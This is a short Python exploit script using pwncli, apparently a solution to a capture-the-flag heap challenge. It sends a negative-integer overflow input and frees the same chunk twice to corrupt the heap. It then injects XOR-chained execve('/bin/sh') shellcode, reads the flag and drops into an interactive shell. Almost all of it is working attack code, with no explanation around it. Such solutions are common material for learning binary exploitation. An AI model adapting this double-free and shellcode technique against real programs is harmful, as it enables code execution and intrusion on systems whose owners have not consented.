#!/usr/bin/python3
from pwncli import *

cli_script()

p:tube = gift['io']
elf:ELF = gift['elf']
libc: ELF = gift['libc']


def add(size, data):
    p.sendlineafter("> ", "1")
    p.sendlineafter("> ", str(size))
    p.sendafter("> ", data)

def dele():
    p.sendlineafter("> ", "2")

p.sendafter("> ", "a")
p.sendlineafter("> ", str(-2147483648))

# add 
add(0x20, 0x20*"a")
dele()
dele()

add(0x20, "\x90")
add(0x20, "a"*0x20)

add(0x20, "The cake is a lie!\x00")

p.sendlineafter("> ", "3")

payload = b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05\x00\x00\x00\x00"

pl = [1]
ss = 1
for i in payload:
    ss ^= i
    pl.append(ss) 

p.sendlineafter("> ", bytes(pl))

p.sendline("cat /flag")
p.interactive()